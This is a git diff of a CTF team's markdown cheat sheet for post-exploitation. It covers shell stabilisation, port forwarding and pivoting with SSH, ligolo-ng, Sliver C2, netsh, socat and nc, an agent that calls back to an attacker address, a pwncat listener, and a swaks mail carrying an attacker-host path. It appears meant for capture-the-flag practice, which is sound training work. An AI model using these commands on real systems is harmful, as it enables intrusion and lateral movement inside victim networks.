@@ -5,8 +5,8 @@ A collection of commands, tools, techniques and procedures of the purplestorm ct
 ## Table of Contents
 
 - [Basics](#basics)
-  - [Stabilizing Linux shell](#stabilizing-linux-shell)
-  - [Port Forwarding](#port-forwarding-1)
+  - [Stabilizing Linux Shell](#stabilizing-linux-shell)
+  - [Port Forwarding](#port-forwarding)
   - [Transfering Files](#transfering-files)
 - [Tooling](#tooling)
   - [Swaks](#swaks)
@@ -18,9 +18,8 @@ A collection of commands, tools, techniques and procedures of the purplestorm ct
   - [SQL Injection](SQL%20Injection.md)
 - [Payloads](#payloads)
   - [Reverse Shell](#reverse-shell)
-- [Exfiltrating Data](#exfiltrating-data)
+- [Data Exfiltration](#exfiltrating-data)
 
-___
 
 ## Basics
 
@@ -28,12 +27,12 @@ ___
 
 1. spawn a pty (required for interactive IO such as `su`)
 
-via python2:
+via `python2`:
 ```shell
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
 
-via python3:
+via `python3`:
 ```shell
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 ```
@@ -51,7 +50,7 @@ stty raw -echo; fg
 ```
 this allows for __CTRL+L__ and __CTRL+C__ to work.
 
-4. 
+4. paste for extra comfort :)
 ```shell
 export SHELL=/bin/bash;
 export TERM=xterm;
@@ -62,9 +61,12 @@ reset;
 
 ### Port Forwarding
 
-if your port forward doesn't work but you're certain it should, did you check the host firewall? :)
+if your port forward doesn't work but you're certain it should: did you check the host firewall? :)
 
 #### Local Port Forward
+
+##### SSH
+
 ```shell
 ssh -L LHOST_IF_ADDR:LPORT:RHOST_IP:RPORT root@10.13.37.16 -i root.key -fN
 ```
@@ -74,10 +76,70 @@ the portfwd happens on __your local machine__ -> listening socket will be on __y
 local port <- remote port  
 a local port forward is used to make an application listening on a target machine's localhost, available on your local machine  
 
-#### Remote Port Forward
+
+##### ligolo-ng
+
 TODO
+```ligolo-ng
+listener_add --tcp --addr 172.16.1.10:61080 --to 10.10.14.14:80
+```
+
+
+##### Sliver C2
+
+open the listening socket `127.0.0.1:8080` (ATTCK host) and forward incoming connections to `172.16.139.10:8080` (AGENT host):  
+```sliver
+portfwd add -b 127.0.0.1:8080 -r 172.16.139.10:8080
+```
+
+
+#### Remote Port Forward
+
+##### SSH
+
 a remote port forward is used to make an application listening on your local machine available on a traget machine
 for ex. forward your netcat listener to a target machine's internal network interface so a reverse shell on the internal network can connect back to you via the target host your listener is forwarded to
+
+
+##### ligolo-ng
+
+```ligolo-ng
+listener_add --tcp --addr 172.16.139.10:61080 --to 10.10.14.14:80
+```
+`172.16.139.10` -> internal host01 ip
+`10.10.14.14` -> attacker ip
+
+A host from the internal network can do web downloads from the attacker host through the internal host01 via port 61080 because of this remote port forward.  
+
+
+##### Sliver C2
+
+open the listening socket `172.16.210.3:61080` (AGENT host) and forward incoming connections to `10.10.14.14:61080` (ATTCK host):  
+```sliver
+rportfwd add -b 172.16.139.10:61080 -r 10.10.14.14:61080
+```
+
+
+##### Windows Native Remote Port Fordward
+
+show port forwards
+```cmd
+netsh interface portproxy show v4tov4
+```
+remote port forward to connect 172.16.210.3:61080 to 172.16.139.10:61080.  
+This means when you connect to 172.16.210.3:61080 your connection will be forwarded to 172.16.139.10:61080  
+```cmd
+netsh interface portproxy add v4tov4 listenport=61080 listenaddress=172.16.210.3 connectport=61080 connectaddress=172.16.139.10
+```
+`172.16.210.3` -> `172.16.139.10`
+
+
+##### Windows Native Firewall
+
+allow incoming connection to tcp port 61080 on the host the command is executed on
+```cmd
+netsh advfirewall firewall add rule name="void_tcp_in_61080" dir=in action=allow protocol=tcp localport=61080
+```
 
 
 #### Chisel:
@@ -91,7 +153,7 @@ for ex. forward your netcat listener to a target machine's internal network inte
 
 On victim:
 
-```
+```shell
 socat tcp-listen:8080,reuseaddr,fork tcp:localhost:9200 &
 ```
 
@@ -99,11 +161,9 @@ socat tcp-listen:8080,reuseaddr,fork tcp:localhost:9200 &
 
 On victim:
 
-```
+```shell
 nc -nlvp 8080 -c "nc localhost 1234"
 ```
-
-___
 
 ## Transfering files
 
@@ -162,7 +222,7 @@ scp some.sh user@10.10.10.10:/tmp/some.sh   # On attacker
 
 - [https://github.com/jetmore/swaks](https://github.com/jetmore/swaks)
 
-```c
+```shell
 swaks --server example.com --port 587 --auth-user "user@example.com" --auth-password "password" --to "user@target.com" --from ""user@example.com" --header "Subject: foobar" --body "\\\<LHOST>\x"
 ```
 
@@ -172,47 +232,55 @@ swaks --server example.com --port 587 --auth-user "user@example.com" --auth-pass
 
 #### Prepare Tunnel Interface
 
-```c
-$ sudo ip tuntap add user $(whoami) mode tun ligolo
-```
-
-```c
-$ sudo ip link set ligolo up
+```shell
+sudo ip tuntap add user $(whoami) mode tun ligolo
+sudo ip link set ligolo up
 ```
 
 #### Setup Proxy on Attacker Machine
 
-```c
-$ ./proxy -laddr <LHOST>:443 -selfcert
+```shell
+./proxy -laddr LHOST:443 -selfcert
 ```
 
 #### Setup Agent on Target Machine
 
-```c
-$ ./agent -connect <LHOST>:443 -ignore-cert
+```shell
+./agent -connect LHOST:443 -ignore-cert
 ```
 
 #### Configure Session
 
-```c
+use the `session` command to select the agent session:
+```ligolo-ng
 ligolo-ng » session
 ```
 
-```c
+display the network configuration of the agent session:
+```ligolo-ng
 [Agent : user@target] » ifconfig
 ```
 
-```c
-$ sudo ip r add 172.16.1.0/24 dev ligolo
+add a route to the target internal network `172.16.1.0/24` via ligolo: (routes created this way are only temporary until the next reboot.)
+```shell
+sudo ip r add 172.16.1.0/24 dev ligolo
+```
+delete a route, in case you messed up:
+```shell
+sudo ip r del 172.16.1.0/24 dev ligolo
 ```
 
-```c
+start tunneling to the target internal network:
+```ligolo-ng
 [Agent : user@target] » start
 ```
 
-#### Port Forwarding
+you can now reach the `172.16.1.0/24` internal network through the ligolo agent.  
+everytime 
 
-```c
+#### ligolo-ng Port Forwarding
+
+```ligolo-ng
 [Agent : user@target] » listener_add --addr <RHOST>:<LPORT> --to <LHOST>:<LPORT> --tcp
 ```
 
@@ -222,13 +290,13 @@ $ sudo ip r add 172.16.1.0/24 dev ligolo
 
 - [https://github.com/calebstewart/pwncat](https://github.com/calebstewart/pwncat)
 
-```
+```shell
 pip install pwncat-cs
 Listener: pwncat-cs 192.168.1.1 4444
 (To change from pwncat shell to local shell, use Ctrl+D)
 ```
 
-## Exfiltrating Data
+## Data Exfiltration
 
 ### Linux
 
